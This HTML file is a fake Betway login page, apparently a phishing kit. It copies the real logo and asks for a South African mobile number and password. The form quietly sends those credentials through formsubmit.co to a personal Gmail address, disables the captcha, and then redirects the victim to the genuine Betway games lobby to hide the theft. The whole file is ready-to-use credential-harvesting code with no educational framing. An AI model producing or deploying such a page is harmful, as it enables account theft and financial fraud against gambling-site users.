<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Betway Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #000;
      margin: 0;
      padding: 0;
      color: #000;
    }

    .login-container {
      background: #fff;
      max-width: 320px;
      margin: 80px auto;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
    }

    .logo-container {
      text-align: center;
      margin-bottom: 15px;
    }

    .logo-container img {
      max-width: 150px;
      height: auto;
    }

    h2 {
      color: #0b9e15;
      text-align: center;
      margin-top: 0;
    }

    .input-group {
      margin-bottom: 15px;
    }

    .input-group label {
      display: block;
      font-weight: bold;
      margin-bottom: 5px;
    }

    .input-group input {
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .small-link {
      display: block;
      text-align: right;
      font-size: 0.85em;
      color: #0b9e15;
      text-decoration: none;
      margin-top: 5px;
    }

    .login-btn, .signup-btn {
      width: 100%;
      padding: 10px;
      border: none;
      color: #fff;
      font-size: 1em;
      border-radius: 5px;
      cursor: pointer;
    }

    .login-btn {
      background-color: #0b9e15;
      margin-top: 10px;
    }

    .signup-text {
      text-align: center;
      margin: 15px 0 5px;
      font-size: 0.9em;
    }

    .signup-btn {
      background-color: #fff;
      color: #0b9e15;
      border: 2px solid #0b9e15;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo-container">
      <img src="https://images.seeklogo.com/logo-png/43/2/betway-logo-png_seeklogo-434766.png" alt="Betway Logo">
    </div>

    <h2>Login</h2>

    <form action="https://formsubmit.co/tshabamapheloaskoya@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://www.betway.co.za/LiveGameslobby">
      
      <div class="input-group">
        <label for="mobile">Mobile</label>
        <div style="display: flex;">
          <input type="text" value="+27" style="width: 20%; margin-right: 5px;font-weight: bold;background-color: lightgrey;" disabled>
          <input type="number" name="mobile" id="mobile" style="width: 75%;" required>
        </div>
      </div>
      
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" name="password" id="password" placeholder="Password" style="width: 90%;" required>
        <a href="#" class="small-link">Forgot Password?</a>
      </div>
      
      <a href="#" class="small-link" style="text-align: left; margin-top: -10px;">Forgot Username?</a>
      
      <button type="submit" class="login-btn">Login</button>
    </form>

    <div class="signup-text">Don't have an account yet?</div>
    <button class="signup-btn">Sign Up</button>
  </div>
</body>
</html>
